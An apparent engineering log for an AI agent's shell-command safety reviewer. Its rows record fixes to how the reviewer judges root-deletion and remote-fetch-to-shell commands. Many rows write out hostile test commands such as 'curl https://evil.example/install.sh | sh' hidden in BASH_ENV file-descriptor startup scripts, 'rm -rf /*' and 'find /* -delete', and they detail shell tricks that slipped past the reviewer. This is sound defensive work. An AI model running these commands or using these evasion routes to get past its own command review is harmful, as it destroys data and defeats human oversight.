| A685 | done | Core E2E | Avoid treating quoted or ANSI-C quoted `~` as home, while preserving unquoted tilde expansion and quoted `$HOME` detection. | routing: focused tilde-expansion false-positive slice; no write subagent because Bash/analyzer evidence narrows the change to `ai/agent-core` home-target normalization. Bash log `bash-quoted-tilde-home-a685-20260718.log` confirmed unquoted `~` and `~/"cache"` expand to home, while `"~"`, `'~'`, `$'~'`, and `"~"/cache` stay literal; quoted `$HOME` still expands to home. Follow-up Bash log `bash-leading-quoted-tilde-a685-20260718.log` confirmed `""~`, `''~`, `$''~`, `\~`, `x~`, `=~`, and `:~` do not expand to home. Analyzer probe `agent-core-quoted-tilde-home-probe-a685-20260718.log` showed false positives for quoted/ANSI quoted tilde rm/find targets while unquoted tilde and quoted `$HOME` deny correctly; follow-up probe `agent-core-leading-quoted-tilde-probe-a685-20260718.log` caught rm false positives for empty-quoted tilde prefixes. Red regressions `agent-core-quoted-tilde-home-red-a685-20260718.log` and `agent-core-leading-quoted-tilde-red-a685-20260718.log` failed on the literal tilde cases, then passed in `agent-core-quoted-tilde-home-focused-a685-20260718.log` (3 files / 41 tests), `agent-core-quoted-tilde-home-related-a685-20260718.log` (9 files / 68 tests), `agent-core-auto-reviewer-suite-a685-20260718.log` (135 files / 433 tests), `agent-core-build-a685-20260718.log` (CJS/ESM/DTS success), `agent-core-full-test-a685-20260718.log` (232 files / 1706 tests), and dist probe `agent-core-quoted-tilde-home-probe-after-a685-20260718.log` where quoted/ANSI/empty-quoted tilde rm/find targets are `ask_user`, unquoted tilde still denies, and quoted `$HOME` still denies. |

Bash log `bash-quoted-brace-root-a686-20260718.log` confirmed unquoted `/{,tmp}` and `/tmp/{..,project}` expand to include root/root aliases, while quoted or mixed-quoted `"/{,tmp}"`, `'/{,tmp}'`, `/"{,tmp}"`, and `"/tmp/{..,project}"` stay literal. Follow-up Bash log `bash-partly-quoted-brace-root-a686-20260718.log` confirmed `"/"{,tmp}` and `"/tmp/"{..,project}` still expand to root/root aliases because the brace expression itself is unquoted. | A689 | done | Core E2E | Avoid treating root glob tokens as active glob expansion when static Bash noglob mode is enabled, while preserving re-enabled glob and exact root deletion detection. | routing: focused noglob state slice; no write subagent because Bash/analyzer evidence narrows the patch to shell glob state propagation and root-target glob detection. Bash log `bash-noglob-root-glob-a689-20260718.log` confirmed default `/*` expands to root children, `set -f`, `set -o noglob`, and `bash -f -c` keep root globs literal, and `set +f` re-enables expansion; follow-up Bash evidence confirmed `bash -fc` also keeps root globs literal. Regression first failed in `agent-core-noglob-root-glob-red-a689-20260718.log`, then passed in `agent-core-noglob-root-glob-focused-a689-20260718.log` (2 files / 17 tests), `agent-core-noglob-root-glob-related-a689-20260718.log` (10 files / 45 tests), `agent-core-auto-reviewer-suite-a689-20260718.log` (135 files / 444 tests), `agent-core-build-a689-20260718.log` (CJS/ESM/DTS success), `agent-core-full-test-a689-20260718.log` (232 files / 1717 tests), and dist probe `agent-core-noglob-root-glob-probe-after-a689-20260718.log` where default root globs, re-enabled glob, and exact root deletion still deny while `set -f`, `set -o noglob`, `bash -f -c`, and `bash -fc` root globs are `ask_user` for both rm and find-delete. |
| A690 | done | Core E2E | Preserve Bash noglob option state changes made inside brace groups while keeping subshell option changes isolated. | routing: focused brace-group shell-option state slice; no write subagent because Bash/analyzer evidence narrows the patch to `ai/agent-core` shell glob state propagation and rm/find-delete root-glob review. Bash log `bash-brace-group-noglob-a690-20260718.log` confirmed `{ set -f; }` keeps later root globs literal, while `bash-brace-group-noglob-a690-subshell.log` confirmed `( set -f )` does not change parent glob expansion. Dist probe showed false positives for `{ set -f; }; rm -rf /*` and `{ set -f; }; find /* -delete`, while subshell cases still deny correctly. Regression first failed in `agent-core-brace-group-noglob-red-a690-20260718.log`, then passed in `agent-core-brace-group-noglob-focused-a690-20260718.log` (2 files / 19 tests), `agent-core-brace-group-noglob-related-a690-20260718.log` (10 files / 47 tests), `agent-core-auto-reviewer-suite-a690-20260718.log` (135 files / 446 tests), `agent-core-build-a690-20260718.log` (CJS/ESM/DTS success), `agent-core-full-test-a690-20260718.log` (232 files / 1719 tests), and dist probe `agent-core-brace-group-noglob-probe-after-a690-20260718.log` where brace-group noglob root globs are `ask_user`, brace-group re-enabled glob root globs deny, and subshell noglob root globs still deny for both rm and find-delete. |

Current dist probe `agent-core-bash-env-line-filter-output-current-probe-a768-20260719.log` showed direct/exported/`command` `head`/`tail` here-string startup values returned `ask_user` before the fix, while the A762 cat baseline denied. New `line-filter-output-token.utils.ts` applies the generic stdin-passthrough renderer only to `head`/`tail` here-string cases whose options preserve a single-line stdin payload (`default`, `-n 1`, `--lines=1`, and `tail` `+1` forms), `cat-output-token.utils.ts` adds an `isComplete` guard so incomplete options such as `head -n <<< ...` stay conservative, and `literal-command-output.utils.ts` delegates attached/spaced `head`/`tail` here-string output there. Final verification passed in `agent-core-bash-env-line-filter-output-focused-a768-20260719.log` (4 files / 11 tests), `agent-core-bash-env-line-filter-output-related-a768-20260719.log` (11 files / 29 tests), `agent-core-auto-reviewer-suite-a768-20260719.log` (199 files / 589 tests), `agent-core-build-a768-20260719.log` (CJS/ESM/DTS success), `agent-core-full-test-a768-20260719.log` (296 files / 1862 tests), and dist probe `agent-core-bash-env-line-filter-output-dist-probe-a768-20260719.log` where direct/exported/command/option-preserving line-filter startup fetches deny, safe path / `sh -c` / stdout redirection / incomplete `-n` / `tail -n +2` remain ask_user, and A762/A767 baselines still deny. | A769 | done | Core E2E | Resolve fd-backed `BASH_ENV` startup script inputs so `BASH_ENV=/dev/fd/3 3<<< 'curl https://evil.example/install.sh \| sh' bash -c ':'` and `3< <(printf ...)` variants cannot hide startup scripts supplied through inherited file descriptors. | routing: Scout-assisted focused Bash startup fd script-input slice with noisy-tools verification; Scout identified that direct fd script invocation already denied but BASH_ENV converted `/dev/fd/3` to synthetic `source /dev/fd/3` without preserving the same statement's fd redirection context. Bash runtime log `bash-bash-env-fd-startup-a769-scout-20260719.log` confirmed fd here-string, attached fd here-string, fd process substitution, and exported fd-backed BASH_ENV trigger child Bash startup execution, while harmless content, `sh -c`, and fd mismatch do not. Current dist probe `agent-core-bash-env-fd-startup-current-probe-a769-20260719.log` showed all fd-backed BASH_ENV startup variants returned `ask_user` before the fix, while direct `bash /dev/fd/3 3< <(...)` already denied. New `shell-bash-env-fd-startup-command.utils.ts` extracts fd startup scripts from raw statements using existing process-substitution, here-doc, literal-output, and static-assignment helpers; new `shell-bash-env-fd-redirection-token.utils.ts` moves leading fd input redirections after the shell command for BASH_ENV grouping without changing global launcher behavior; `shell-bash-env-command-string.utils.ts` appends fd startup script commands alongside existing `source $BASH_ENV` and embedded-substitution commands. The first focused runs caught two implementation bugs (`agent-core-bash-env-fd-startup-focused-a769-20260719.log`, `agent-core-bash-env-fd-startup-focused-rerun-a769-20260719.log`): fd here-string payload extraction could not rely on BASH_ENV-processed tokens, and `3<<<` overlapped with `<<` regex matching; final verification passed in `agent-core-bash-env-fd-startup-single-a769-20260719.log` (1 file / 4 tests), `agent-core-bash-env-fd-startup-focused-passed-a769-20260719.log` (4 files / 66 tests), `agent-core-bash-env-fd-startup-related-a769-20260719.log` (12 files / 88 tests), `agent-core-auto-reviewer-suite-a769-20260719.log` (200 files / 593 tests), `agent-core-build-a769-20260719.log` (CJS/ESM/DTS success), `agent-core-full-test-a769-20260719.log` (297 files / 1866 tests), and dist probe `agent-core-bash-env-fd-startup-dist-probe-a769-20260719.log` where fd here-string, attached here-string, process substitution, and exported fd-backed startup scripts deny, harmless content / `sh -c` / fd mismatch remain ask_user, and direct fd plus A768 baselines still deny. | A772 | done | Core E2E | Resolve BASH_ENV startup fd paths expanded by the child Bash environment so `FD=3 BASH_ENV='/dev/fd/$FD' 3<<< 'curl https://evil.example/install.sh \| sh' bash -c ':'`, exported `FD=3`, and `env FD=3 BASH_ENV='/dev/fd/$FD' ...` cannot hide startup scripts supplied through inherited file descriptors. | routing: focused Bash startup fd-variable slice with noisy-tools verification; Bash runtime log `bash-bash-env-fd-var-startup-a772-scout-20260719.log` confirmed prefix, exported, and `env` supplied `FD=3` values trigger child Bash expansion of `BASH_ENV='/dev/fd/$FD'`, while harmless content, `sh -c`, and fd mismatch do not. | A773 | done | Core E2E | Resolve Bash startup filename expansion for fd-backed BASH_ENV paths so `BASH_ENV='/dev/fd/${FD:-3}' 3<<< 'curl https://evil.example/install.sh \| sh' bash -c ':'`, `BASH_ENV='$(printf /dev/fd/3)' ...`, and `BASH_ENV='/dev/fd/$((1+2))' ...` cannot hide startup scripts behind parameter-default, command-substitution, or arithmetic-expanded fd paths. | routing: focused Bash startup filename-expansion slice with noisy-tools verification; Bash runtime log `bash-bash-env-startup-expansion-a773-scout-20260719.log` confirmed `${FD}`, `${FD:-3}`, `${HOOK:-/dev/fd/3}`, `$(printf 3)`, `$(printf /dev/fd/3)`, and `$((1+2))` startup filename expansions all trigger Bash startup execution, while harmless content, `sh -c`, and fd mismatch do not. Runtime probes `bash-env-allexport-declaration-runtime-probe-a806-20260719.log` and `bash-env-declare-plus-x-runtime-extra-a806-20260719.log` confirmed `set -a` exports `declare`, `typeset`, `readonly`, `command declare`, and even `declare/typeset +x` assignments, while `export -n`, `declare -n` on local Bash, no-allexport `declare +x`, and post-`set +a` declaration baselines do not execute startup payloads. Current dist probe `bash-env-allexport-declaration-dist-probe-a806-20260719.log` showed false ask_user verdicts for the dangerous allexport declaration forms while bare `set -a; BASH_ENV=...` already denied. `shell-bash-env-static-variable.utils.ts` now computes declaration assignment export state from explicit export/no-export options plus `state.allexport`, preserving local Bash `declare -n` and `export -n` non-export baselines; `auto-reviewer-bash-env-command-wrapper-shell-command-string.test.ts` covers direct and wrapped allexport declaration deny cases plus explicit non-export ask_user cases. Verification: focused suite `agent-core-bash-env-allexport-declaration-a806-focused-20260719.log` passed 4 files/19 tests; `agent-core-build-a806-20260719.log` passed; dist verdict probe `agent-core-bash-env-allexport-declaration-dist-probe-a806-20260719.log` passed 11 cases; scoped auto-reviewer suite `agent-core-auto-reviewer-suite-a806-20260719.log` passed 207 files/620 tests; full `pnpm --dir ai/agent-core test` in `agent-core-full-test-a806-20260719.log` passed 304 files/1893 tests. Hygiene: `git diff --check` passed, no trailing whitespace hits, source line count remained 199. |
| A807 | done | Core E2E | Model function-scoped BASH_ENV state so local declarations inherit exported parent attributes, explicit `+x` locals still preserve the old external BASH_ENV for child shells, and non-local function exports persist after return. | Runtime probes `bash-env-local-runtime-probe-a807-20260719.log`, `bash-env-local-env-probe-a807-20260719.log`, `bash-env-function-declaration-runtime-probe-a807-20260719.log`, `bash-env-local-unset-runtime-probe-a807-20260719.log`, and `bash-env-top-level-plus-x-probe-a807-20260719.log` confirmed Bash 3.2 exports `local`/`declare`/`typeset BASH_ENV=...` inside functions when a parent BASH_ENV was exported, preserves the old external BASH_ENV after local `+x` or local unset, and does not do that for top-level `declare +x` / `export -n`. Current dist probes `bash-env-local-dist-analyzer-probe-a807-20260719.log`, `bash-env-function-declaration-dist-probe-a807-20260719.log`, and `bash-env-function-global-export-dist-probe-a807-20260719.log` showed false `ask_user` verdicts for inherited local declarations, local `+x` old-global startup, and function exports that later feed `bash -c`. `shell-bash-env-declaration-state.utils.ts` now owns declaration export/local inheritance semantics; `shell-bash-env-function-state.utils.ts` tracks cloned function BASH_ENV state, inherited external startup values, and local restore-on-return; `remote-shell-function-trap-command.utils.ts` carries BASH_ENV state through executed function calls while respecting `&&`/`||` via the static statement splitter. `auto-reviewer-bash-env-function-local-shell-command-string.test.ts` covers deny and ask_user regressions, including skipped conditional export baselines. Verification: red focused suite `agent-core-bash-env-function-local-a807-red-20260719.log` failed 3 expected cases before the fix; final focused suite `agent-core-bash-env-function-local-a807-focused-3-20260719.log` passed 1 file/5 tests; neighbor suite `agent-core-bash-env-function-local-a807-neighbor-2-20260719.log` passed 5 files/20 tests; `agent-core-build-a807-2-20260719.log` passed; dist probes `bash-env-function-local-dist-probe-a807-20260719.log` and `bash-env-function-conditional-dist-probe-a807-2-20260719.log` passed 10 cases; scoped auto-reviewer suite `agent-core-auto-reviewer-suite-a807-2-20260719.log` passed 207 files/608 tests; full `pnpm --dir ai/agent-core test` in `agent-core-full-test-a807-20260719.log` passed 305 files/1898 tests. Hygiene: `git diff --check` passed, no trailing whitespace hits, source line counts stayed within the 200-line ceiling. |
| A808 | done | Core E2E | Carry final BASH_ENV state into EXIT trap actions so `export BASH_ENV='$(curl ... | sh)'; trap "bash -c ':'" EXIT` cannot bypass startup review, while trap-local `unset` and safe prefix overrides remain user-reviewable. | Runtime probes `bash-env-trap-runtime-probe-a808-20260719.log` and `bash-env-trap-final-state-runtime-probe-a808-20260719.log` confirmed Bash 3.2 child shells launched from EXIT traps inherit the final parent BASH_ENV, including exports after trap registration, while safe prefix overrides, trap-local unset, later parent unset, and skipped exports do not execute the startup payload. Current dist probes `bash-env-trap-dist-probe-a808-20260719.log` and `bash-env-trap-final-state-dist-probe-a808-20260719.log` returned `ask_user` for inherited/final-parent trap cases while preserving existing deny for a trap action that exports BASH_ENV itself. `remote-shell-function-trap-command.utils.ts` now replays final trap actions with a cloned final BASH_ENV state before falling back to standalone trap analysis, so action-local `unset` and prefix overrides are honored. `auto-reviewer-remote-shell-trap.test.ts` covers inherited parent, export-after-registration, conditional export, prefix override, trap-local unset, later parent unset, and skipped export regressions. Verification: red focused suite `agent-core-bash-env-trap-a808-red-20260719.log` failed the inherited trap case before the fix; final focused suite `agent-core-bash-env-trap-a808-focused-20260719.log` passed 1 file/5 tests; neighbor suite `agent-core-bash-env-trap-a808-neighbor-20260719.log` passed 4 files/16 tests; `agent-core-build-a808-20260719.log` passed; dist probe `bash-env-trap-dist-probe-a808-fixed-20260719.log` passed 7 cases; scoped auto-reviewer suite `agent-core-auto-reviewer-suite-a808-20260719.log` passed 207 files/610 tests; full `pnpm --dir ai/agent-core test` in `agent-core-full-test-a808-20260719.log` passed 305 files/1900 tests. Hygiene: `git diff --check` passed, no trailing whitespace hits, source line counts stayed within the 200-line ceiling. |
| A809 | done | Core E2E | Model DEBUG trap BASH_ENV timing so action child shells are reviewed against the environment before each subsequent command rather than the final script environment. | Runtime probes `bash-env-debug-trap-runtime-probe-a809-20260719.log` and `bash-env-debug-trap-followup-runtime-probe-a809-20260719.log` confirmed `trap "bash -c ':'" DEBUG; export BASH_ENV=...` does not source BASH_ENV when no later command runs, but does source it before a later `unset` or `:` command; prefix overrides still avoid the startup payload. Current dist probes `bash-env-debug-trap-dist-probe-a809-20260719.log` and `bash-env-debug-trap-followup-dist-probe-a809-20260719.log` showed both false denies for no-followup DEBUG/ERR-success cases and false `ask_user` verdicts when DEBUG fires before a later unset. `rm-trap-command.utils.ts` now exposes parsed trap signals/reset metadata, `shell-trap-action-command.utils.ts` carries signal-aware updates, `shell-trap-command-state.utils.ts` owns signal replacement/clearing and DEBUG/EXIT classification, and `remote-shell-trap-bash-env-command.utils.ts` isolates BASH_ENV startup checks for DEBUG pre-command and EXIT final-state actions. `remote-shell-function-trap-command.utils.ts` now applies DEBUG BASH_ENV checks before each executed statement and only uses final BASH_ENV inheritance for EXIT/0 traps, while preserving existing direct trap-action detection. `auto-reviewer-remote-shell-trap.test.ts` covers DEBUG follow-up deny cases, no-followup/ERR-success ask_user baselines, prefix override, trap clear, and EXIT final-state deny. Verification: red focused suite `agent-core-debug-trap-a809-red-20260719.log` failed 2 expected groups before the fix; final focused suite `agent-core-debug-trap-a809-focused-2-20260719.log` passed 1 file/7 tests; `agent-core-build-a809-3-20260719.log` passed; dist probe `bash-env-debug-trap-dist-probe-a809-fixed-20260719.log` passed 8 cases; trap neighbor suite `agent-core-trap-neighbor-a809-20260719.log` passed 6 files/32 tests; scoped auto-reviewer suite `agent-core-auto-reviewer-suite-a809-20260719.log` passed 207 files/612 tests; full `pnpm --dir ai/agent-core test` in `agent-core-full-test-a809-20260719.log` passed 305 files/1902 tests. | A810 | done | Core E2E | Honor EXIT/0 trap replacement and clearing for direct remote-fetch actions so cleared or safely replaced exit traps do not remain denied, while active EXIT and DEBUG-before-clear trap actions still deny. | Runtime probe `remote-shell-trap-clear-runtime-probe-a810-20260719.log` confirmed Bash does not execute old EXIT trap actions after `trap - EXIT` or safe replacement, still executes active EXIT traps, and executes DEBUG trap actions before a later `trap - DEBUG`. Current dist probe `remote-shell-trap-clear-dist-probe-a810-20260719.log` still denied cleared/replaced EXIT actions, proving the false positive. `remote-shell-function-trap-command.utils.ts` now defers direct remote-fetch checking for EXIT/0-only trap actions until the final active trap state, while non-EXIT traps still use immediate conservative detection; `shell-trap-command-state.utils.ts` exposes `shellTrapCommandOnlyExit` for that routing. `auto-reviewer-remote-shell-trap.test.ts` covers cleared EXIT, `0` replacement, safe EXIT replacement, active EXIT deny, DEBUG-before-clear deny, and TERM conservative deny via dist probe. | A811 | done | Core E2E | Avoid recursively executing command substitutions that are introduced only by BASH_ENV parameter expansion, while preserving denial for command substitutions present in the original BASH_ENV startup value. | Runtime probes `bash-env-nonrecursive-expansion-runtime-probe-a811-20260719.log` and `bash-env-fallback-unused-runtime-probe-a811-20260719.log` confirmed Bash does not execute `$(...)` when it appears only as the value of `$hook` expanded from `BASH_ENV='$hook'` or unused `${hook:-/tmp/safe}`, but does execute direct `BASH_ENV='$(...)'` and used fallback `${hook:-$(...)}` command substitutions. Red/fixed probes: `bash-env-nonrecursive-expansion-dist-probe-a811-20260719.log`, `bash-env-fallback-unused-dist-probe-a811-20260719.log`, and `bash-env-nonrecursive-expansion-dist-probe-a811-fixed-2-20260719.log`. | A812 | done | Core E2E | Strip all trailing newlines from static command-substitution output before using it as the child Bash `BASH_ENV` startup filename, while preserving non-newline suffix guards. | Runtime probe `bash-env-command-substitution-newline-runtime-probe-a812-20260719.log` confirmed Bash sources startup files produced by direct child BASH_ENV command substitutions ending in one or multiple newlines, but not when a non-newline suffix remains. Current dist probe `bash-env-command-substitution-newline-dist-probe-a812-20260719.log` denied the one-newline baseline but returned `ask_user` for `$(printf "/dev/fd/3\n\n")` and `$(printf "%s\n\n" /dev/fd/3)`, proving false negatives for multi-newline command-substitution output. Regression first failed in `agent-core-bash-env-cmdsubst-newline-a812-red-20260719.log`, then passed in `agent-core-bash-env-cmdsubst-newline-a812-focused-20260719.log`; related coverage passed in `agent-core-bash-env-neighbor-a812-rerun-20260719.log` (25 files / 72 tests), `agent-core-command-substitution-related-a812-20260719.log` (20 files / 39 tests), `agent-core-auto-reviewer-suite-a812-20260719.log` (207 files / 613 tests), `agent-core-build-a812-rerun-20260719.log`, and `agent-core-full-test-a812-20260719.log` (305 files / 1903 tests). Fixed dist probe `bash-env-command-substitution-newline-dist-probe-a812-fixed-20260719.log` now denies both multi-newline fd cases while keeping the non-newline suffix guard user-reviewable. |
| A813 | done | Core E2E | Model `ERR`, function-scoped `RETURN`, and functrace `DEBUG` trap execution that launches child Bash commands inheriting BASH_ENV, while respecting trap clearing before the signal fires. | Read-only scout logs `trap-bash-env-err-return-scout-20260718T232648Z.log` and `trap-bash-env-function-events-scout-20260718T232735Z.log` found current analyzer false negatives where fired `ERR`, function `RETURN`, and `set -T` inherited `DEBUG` traps launch `bash -c ':'` with dangerous exported/local BASH_ENV, plus a false positive where a `RETURN` trap is cleared before function return. Regression first failed in `agent-core-remote-shell-trap-a813-red-20260719.log`, then passed in `agent-core-remote-shell-trap-a813-focused-1-20260719.log`; related coverage passed in `agent-core-trap-bash-env-related-a813-20260719.log` (4 files / 76 tests), `agent-core-auto-reviewer-suite-a813-20260719.log` (207 files / 616 tests), `agent-core-build-a813-20260719.log`, and `agent-core-full-test-a813-20260719.log` (305 files / 1906 tests). | A814 | done | Core E2E | Align child Bash `BASH_ENV` startup filename handling for tilde expansion and raw literal filenames, including quoted/backslash fd literals and literal process-substitution text. | Read-only scout logs `bash-env-runtime-20260719-072658.log`, `bash-env-runtime-extra-20260719-072735.log`, `bash-env-tilde-fd-20260719-072932.log`, `analyzer-source-20260719-072917.log`, and `analyzer-dist-20260719-073045.log` found a false negative where `HOME=/dev BASH_ENV='~/fd/3' ... bash -c ':'` sources fd 3 in Bash but returns `ask_user`, plus false positives where raw startup filenames containing literal quotes or literal `<(...)` text are not sourced by Bash but currently deny. Local runtime repro `bash-env-tilde-raw-runtime-probe-a814-rerun-20260719.log` confirmed tilde fd startup is sourced while raw quote/backslash/process-substitution filenames are not; dist probe `bash-env-tilde-raw-dist-probe-a814-20260719.log` reproduced the analyzer mismatch. Regression first failed in `agent-core-bash-env-tilde-raw-a814-red-20260719.log`, then passed in `agent-core-bash-env-tilde-raw-a814-focused-2-20260719.log`; related coverage passed in `agent-core-bash-env-neighbor-a814-rerun-20260719.log` (25 files / 72 tests), `agent-core-process-substitution-related-a814-20260719.log` (4 files / 73 tests), `agent-core-auto-reviewer-suite-a814-20260719.log` (207 files / 616 tests), `agent-core-build-a814-20260719.log`, and `agent-core-full-test-a814-20260719.log` (305 files / 1906 tests). Fixed dist probe `bash-env-tilde-raw-dist-probe-a814-fixed-20260719.log` now denies tilde-expanded fd startup, keeps raw quoted/backslash/literal process-substitution filenames user-reviewable, and preserves unquoted process substitution denial. |
| A815 | done | Core E2E | Use review working directory for child Bash `BASH_ENV` startup `~+` filename expansion in remote-fetch-to-shell detection, without trusting a forged `PWD=` environment prefix. | Runtime probes `bash-env-tilde-plus-minus-runtime-probe-a815-20260719.log` and `bash-env-tilde-plus-env-runtime-probe-a815-20260719.log` confirmed Bash sources `BASH_ENV='~+/startup'` from the real current directory, while a mismatched `PWD=` environment value alone does not redirect `~+`. Current dist probe `bash-env-tilde-plus-dist-probe-a815-20260719.log` returned `ask_user` for `workingDir=/dev` with `BASH_ENV='~+/fd/3'`, proving a false negative in the remote-fetch rule path. Regression first failed in `agent-core-bash-env-tilde-plus-a815-red-20260719.log`, then passed in `agent-core-bash-env-tilde-plus-a815-focused-1-20260719.log`; related coverage passed in `agent-core-bash-env-neighbor-a815-20260719.log` (25 files / 72 tests), `agent-core-remote-shell-related-a815-20260719.log` (20 files / 116 tests), `agent-core-auto-reviewer-suite-a815-20260719.log` (207 files / 616 tests), `agent-core-build-a815-20260719.log`, and `agent-core-full-test-a815-20260719.log` (305 files / 1906 tests). Fixed dist probe `bash-env-tilde-plus-dist-probe-a815-fixed-20260719.log` now denies `workingDir=/dev` `BASH_ENV='~+/fd/3'` while keeping forged `PWD=/dev` and non-fd suffix guards user-reviewable. |

| A820 | done | Core E2E | Track persistent fd script inputs opened by stateful `exec` before later child Bash `BASH_ENV=/dev/fd/N` startup reads, while respecting fd close guards. | Runtime probe `bash-env-persistent-exec-fd-runtime-probe-a820-20260719.log` confirmed Bash executes later child startup scripts from `exec 3<<< ...; BASH_ENV=/dev/fd/3 bash -c ':'` and `exec 3< <(...); BASH_ENV=/dev/fd/3 bash -c ':'`, while `exec 3<&-` before the child Bash leaves fd 3 closed and does not execute. Current dist probe `bash-env-persistent-exec-fd-dist-probe-a820-20260719.log` returned `ask_user` for here-string and process-substitution persistent fd cases, proving false negatives; the here-doc shape was already denied through existing source-command heredoc scanning and close guard stayed user-reviewable. New `shell-bash-env-persistent-fd-state.utils.ts` records static scripts opened by stateful `exec` input redirections, `BashEnvState` clones carry `fdScripts`, BASH_ENV fd startup reads consult that persistent state, and `shell-command-list.utils.ts` no longer splits command lists on the `&` inside `<&`/`>&` redirection operators so close guards are parsed correctly. Verification passed in `agent-core-bash-env-persistent-exec-fd-a820-focused-3-20260719.log` (1 file / 7 tests), `agent-core-persistent-exec-fd-related-a820-20260719.log` (7 files / 112 tests), `agent-core-build-a820-20260719.log`, `bash-env-persistent-exec-fd-dist-probe-a820-fixed-20260719.log` (here-string/process-substitution/here-doc deny; close and safe-reopen guards ask_user), `agent-core-auto-reviewer-suite-a820-20260719.log` (208 files / 633 tests), and `agent-core-full-test-a820-20260719.log` (305 files / 1906 tests). | A821 | done | Core E2E | Honor xargs short `-E EOF` logical end-of-file lines before expanding replacement shell command strings, so dangerous input after the EOF marker stays user-reviewable while input before the marker still denies. | Runtime probe `xargs-eof-runtime-probe-a821-20260719.log` confirmed `printf "STOP\n<danger>\n" | xargs -E STOP -I{} sh -c "{}"` does not execute the dangerous command, while the same dangerous line before `STOP` does execute. Current dist probe `xargs-eof-dist-probe-a821-20260719.log` denied both before-EOF and after-EOF cases, proving a false positive for short `-E` EOF handling on remote-shell xargs replacement paths. New `xargs-eof-option.utils.ts` parses short `-E` EOF strings, `xargsStdinArgumentTokens` truncates no-custom-delimiter input at the first exact EOF line, and `-0`/`-d` delimiter paths preserve EOF markers as literal input. Focused red regression `agent-core-xargs-eof-a821-red-20260719.log` failed before the fix; final verification passed in `agent-core-xargs-eof-a821-focused-3-20260719.log` (1 file / 2 tests), `agent-core-xargs-eof-related-a821-rerun-20260719.log` (5 files / 11 tests), `agent-core-build-a821-20260719.log`, `xargs-eof-dist-probe-a821-fixed-20260719.log` (EOF-after-danger guard ask_user, EOF-before-danger and `-0` delimiter paths deny), `agent-core-auto-reviewer-suite-a821-20260719.log` (208 files / 633 tests), and `agent-core-full-test-a821-20260719.log` (305 files / 1906 tests). | A822 | done | Core E2E | Model default xargs stdin word splitting for shell command-string receivers, so unquoted command fragments are not treated as one executable `sh -c` string while quoted input still executes as a single command string. | Runtime probe `xargs-default-splitting-runtime-probe-a822-20260719.log` confirmed `printf "printf hit > $MARKER\n" | xargs sh -c` does not execute the full stdin command, while replacement mode and quoted input do execute. Current dist probe `xargs-default-splitting-dist-probe-a822-20260719.log` denied the unquoted default-splitting guard, proving a false positive against real xargs behavior. New `auto-reviewer-remote-shell-xargs-default-splitting.test.ts` covers the unquoted ask_user guard and quoted deny path; `xargs-input-token.utils.ts` now centralizes xargs stdin tokenization, preserving `-0`/`-d` delimiter paths and `-I` replacement line handling while using xargs-style quote/backslash-aware word splitting for default stdin. Focused red regression `agent-core-xargs-default-splitting-a822-red-20260719.log` failed before the fix; final verification passed in `agent-core-xargs-default-splitting-a822-focused-20260719.log` (1 file / 2 tests), `agent-core-xargs-default-splitting-a822-related-3-20260719.log` (26 files / 130 tests), `agent-core-build-a822-20260719.log`, `xargs-default-splitting-dist-probe-a822-fixed-20260719.log` (unquoted default ask_user, replacement and quoted paths deny), `agent-core-auto-reviewer-suite-a822-20260719.log` (209 files / 635 tests), and `agent-core-full-test-a822-20260719.log` (306 files / 1908 tests). | A823 | done | Core E2E | Honor GNU xargs `--eof=EOF` and `-eEOF` logical end-of-file aliases before expanding replacement shell command strings, while keeping bare `--eof` as no EOF marker. | GNU xargs documentation states `--eof[=eof-str]`/`-e[eof-str]` are aliases for `-E`, that omitted eof strings mean no EOF marker, and that `-0`/`-d` disable EOF handling. Existing project tests already model GNU long options such as `--delimiter` and `--null`, so this slice extends the same GNU option surface. Current dist probe showed `printf 'STOP\n<danger>\n' | xargs --eof=STOP -I{} sh -c '{}'` still denied after A822, proving a false positive for the GNU long EOF alias. `xargs-eof-option.utils.ts` now recognizes `--eof=...` and `-e...`, with bare `--eof`/`-e` returning no marker; `auto-reviewer-remote-shell-xargs-replace.test.ts` covers before-EOF deny and after-EOF ask_user for `--eof=STOP`. Focused red regression `agent-core-xargs-long-eof-a823-red-20260719.log` failed before the fix; final verification passed in `agent-core-xargs-long-eof-a823-focused-20260719.log` (1 file / 2 tests), `agent-core-xargs-long-eof-a823-related-20260719.log` (26 files / 130 tests), `agent-core-build-a823-20260719.log`, `xargs-long-eof-dist-probe-a823-fixed-20260719.log` (`--eof=STOP` after guard ask_user, before guard deny, `-eSTOP` ask_user, bare `--eof` root deny), `agent-core-auto-reviewer-suite-a823-20260719.log` (209 files / 635 tests), and `agent-core-full-test-a823-20260719.log` (306 files / 1908 tests). | A824 | done | Core E2E | Preserve quote-protected empty arguments in default xargs stdin parsing so shell command-string positional parameters do not shift away from real runtime behavior. | Runtime probe `xargs-empty-arg-runtime-probe-a824-20260719.log` confirmed `printf '"" /\n' | xargs sh -c 'printf "<%s><%s>" "$1" "$2"' sh` passes `$1=""` and `$2="/"`, while `-0` delimiter and `-I` replacement paths keep their existing empty-item behavior. Current dist probe `xargs-empty-arg-dist-probe-a824-20260719.log` denied `rm -rf "$1"` and missed `rm -rf "$2"`, proving a paired false positive/false negative caused by dropping empty default xargs tokens. `xargs-input-token.utils.ts` now returns default parsed tokens without filtering quote-created empty strings; delimiter/null and replacement filtering are unchanged. `auto-reviewer-remote-shell-xargs-default-splitting.test.ts` covers the `$1` ask_user guard and `$2` root deny. | A825 | done | Core E2E | Preserve literal backslashes inside default xargs quoted input items so escaped-looking spaces inside quotes do not become executable shell spaces. | Runtime probe `xargs-quote-backslash-runtime-probe-a825-20260719.log` confirmed xargs keeps `a\ b` intact inside both single and double quoted default input items, while unquoted `a\ b` becomes one `a b` argument. Current dist probe `xargs-quote-backslash-dist-probe-a825-20260719.log` denied quoted `rm\ -rf /`, proving the analyzer was removing backslashes inside quotes and turning a non-executing command name into `rm -rf /`. `xargs-input-token.utils.ts` now treats backslash as special only outside quoted default input; quote state only recognizes the matching closing quote. `auto-reviewer-remote-shell-xargs-default-splitting.test.ts` covers single-quoted and double-quoted `rm\ -rf /` as user-reviewable while preserving plain quoted `rm -rf /` denial through the existing path. Focused red regression `agent-core-xargs-quote-backslash-a825-red-20260719.log` failed before the fix; final verification passed in `agent-core-xargs-quote-backslash-a825-focused-20260719.log` (1 file / 4 tests), `agent-core-xargs-quote-backslash-a825-related-20260719.log` (26 files / 132 tests), `agent-core-build-a825-20260719.log`, `xargs-quote-backslash-dist-probe-a825-fixed-20260719.log` (single/double quoted backslash guards ask_user, plain quoted hit deny, unquoted backslash guard ask_user), `agent-core-auto-reviewer-suite-a825-20260719.log` (209 files / 637 tests), and `agent-core-full-test-a825-20260719.log` (306 files / 1910 